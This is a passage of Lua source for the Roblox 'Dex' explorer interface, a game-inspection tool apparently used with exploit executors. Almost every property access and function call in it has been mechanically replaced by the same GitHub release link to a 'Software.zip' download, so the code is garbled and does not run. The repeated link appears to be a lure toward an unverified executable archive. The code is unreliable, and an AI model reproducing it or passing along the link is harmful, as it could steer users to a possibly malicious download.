			{14,"UIGradient",{Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),}),}},
			{15,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Image="rbxassetid://1427967925",Name="Outlines",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-5,0,-5),ScaleType=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,1,10),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(6,6,25,25),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),}},
			{16,"UIGradient",{Parent={15},Rotation=-30,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),}),}},
			{17,"UIGradient",{Parent={2},Rotation=-30,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),}),}},
		})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(gui)
		local backGradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local outlinesGradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local holderGradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local titleText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local descText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local versionText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local versionGradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local creatorText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local creatorGradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local statusText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local progressBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local tweenS = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		
		local renderStepped = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local signalWait = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local fastwait = function(s)
			if not s then return signalWait(renderStepped) end
			local start = tick()
			while tick() - start < s do signalWait(renderStepped) end
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = initStatus
		
		local function tweenNumber(n,ti,func)
			local tweenVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("IntValue")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(func)
			local tween = tweenS:Create(tweenVal,ti,{Value = n})
			tween:Play()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				tweenVal:Destroy()
			end)
		end
		
		local ti = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		tweenNumber(100,ti,function(val)
			    val = val/200
				local start = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0)
				local a1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val,0)
				local a2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,val+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.05,val)),1)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then a2 = a1 end
				local b1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1-val,0)
				local b2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.05,val)),1)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then b2 = b1 end
				local goal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,b2,b1,goal})
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,b2,b1,goal})
		end)
		
		fastwait(0.4)
		
		tweenNumber(100,ti,function(val)
			val = val/166.66
			local start = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0)
			local a1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val,0)
			local a2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val+0.01,1)
			local goal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,goal})
		end)
		
		tweenS:Create(titleText,ti,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,60,0,15), TextTransparency = 0}):Play()
		tweenS:Create(descText,ti,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,60), TextTransparency = 0}):Play()
		
		local function rightTextTransparency(obj)
			tweenNumber(100,ti,function(val)
				val = val/100
				local a1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1-val,0)
				local a2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1-val-0.01),1)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then a2 = a1 end
				local start = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,a1 == a2 and 0 or 1)
				local goal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a2,a1,goal})
			end)
		end
		rightTextTransparency(versionGradient)
		rightTextTransparency(creatorGradient)
		
		fastwait(0.9)
		
		local progressTI = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		
		tweenS:Create(statusText,progressTI,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,120), TextTransparency = 0}):Play()
		tweenS:Create(progressBar,progressTI,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,60,0,145), Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,4)}):Play()
		
		fastwait(0.25)
		
		local function setProgress(text,n)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = text
			tweenS:Create(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,progressTI,{Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(n,0,1,0)}):Play()
		end
		
		local function close()
			tweenS:Create(titleText,progressTI,{TextTransparency = 1}):Play()
			tweenS:Create(descText,progressTI,{TextTransparency = 1}):Play()
			tweenS:Create(versionText,progressTI,{TextTransparency = 1}):Play()
			tweenS:Create(creatorText,progressTI,{TextTransparency = 1}):Play()
			tweenS:Create(statusText,progressTI,{TextTransparency = 1}):Play()
			tweenS:Create(progressBar,progressTI,{BackgroundTransparency = 1}):Play()
			tweenS:Create(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,progressTI,{BackgroundTransparency = 1}):Play()
			tweenS:Create(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,progressTI,{ImageTransparency = 1}):Play()
			
			tweenNumber(100,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),function(val)
				val = val/250
				local start = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0)
				local a1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.6+val,0)
				local a2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.601+val),1)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then a2 = a1 end
				local goal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,a1 == a2 and 0 or 1)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,goal})
			end)
			
			fastwait(0.5)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 30
			
			tweenNumber(100,ti,function(val)
				val = val/100
				local start = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1)
				local a1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val,1)
				local a2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,val+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.05,val)),0)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then a2 = a1 end
				local goal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,a1 == a2 and 1 or 0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,goal})
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({start,a1,a2,goal})
			end)
			
			fastwait(0.45)
			gui:Destroy()
		end
		
		return {SetProgress = setProgress, Close = close}
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(data)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then return end -- TODO: Handle conflict
		local control = {}
		
		local app = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		local iconIndex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and iconIndex then
			if type(iconIndex) == "number" then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,iconIndex)
			elseif type(iconIndex) == "string" then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,iconIndex)
			end
		elseif type(iconIndex) == "string" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = iconIndex
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
		end
		
		local function updateState()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 0 or (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) and 0 or 1)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
		
		local function enable(silent)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			updateState()
			if not silent then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
			end
		end
		
		local function disable(silent)
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			updateState()
			if not silent then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
			end
		end
		
		updateState()
		
		local ySize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,14,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(62,999999)).Y
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(46+ySize,60,74))
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end)
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 0 or 1
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end)
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then disable() else enable() end
		end)
		
		local window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if window then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() enable(true) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() disable(true) end)
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*82 + 8)
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = enable
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = disable
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = control
		return control
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(val)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val and "X" or "Dex"
		if val then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,224,0,200) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.2,true)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val and 0 or (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) and 0 or 0.2)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),{BackgroundTransparency = val and 0 or (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) and 0 or 0.2)}):Play()
		
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
		
		if not val then
			local startTime = tick()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = startTime
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and startTime == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false end
			end)()
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(false)
				end
			end)
		end
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local gui = create({
			{1,"ScreenGui",{IgnoreGuiInset=true,Name="MainMenu",}},
			{2,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0),AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,Font=4,Name="OpenButton",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,32,0,32),Text="Dex",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=16,TextTransparency=0.20000000298023,}},
			{3,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={2},}},
			{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),ClipsDescendants=true,Name="MainFrame",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,1,-4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,224,0,200),}},
			{5,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={4},}},
			{6,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),Name="BottomFrame",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-24),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,24),}},
			{7,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={6},}},
			{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="CoverFrame",Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,4),}},
			{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1294117718935,0.1294117718935,0.1294117718935),BorderSizePixel=0,Name="Line",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,-1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
			{10,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Settings",Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-48,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,24,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{11,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://6578871732",ImageTransparency=0.20000000298023,Name="Icon",Parent={10},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{12,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Information",Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-24,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,24,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{13,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://6578933307",ImageTransparency=0.20000000298023,Name="Icon",Parent={12},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{14,"ScrollingFrame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1294117718935,0.1294117718935,0.1294117718935),BorderSizePixel=0,Name="AppsFrame",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),ScrollBarThickness=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,222,1,-25),}},
			{15,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="Container",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-14,0,2),}},
			{16,"UIGridLayout",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,66,0,74),Parent={15},SortOrder=2,}},
			{17,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="App",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,100),Visible=false,}},
			{18,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),BorderSizePixel=0,Font=3,Name="Main",Parent={17},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,60),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
			{19,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://6579106223",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(32,32),Name="Icon",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-16,0,4),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,32,0,32),}},
			{20,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="AppName",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,38),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,1,-40),Text="Explorer",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.10000000149012,TextTruncate=1,TextWrapped=true,TextYAlignment=0,}},
			{21,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.66666668653488,1),BorderSizePixel=0,Name="Highlight",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,2),}},
		})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = gui
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		
		local openButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.2
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end)
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),{BackgroundTransparency = 0}):Play()
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),{BackgroundTransparency = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 0 or 0.2}):Play()
			end
		end)
		
		-- Create Main Apps
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Name = "Explorer", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Explorer", Open = true, Window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Name = "Properties", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Properties", Open = true, Window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Name = "Script Viewer", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Script_Viewer", Window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})

		local cptsOnMouseClick = nil
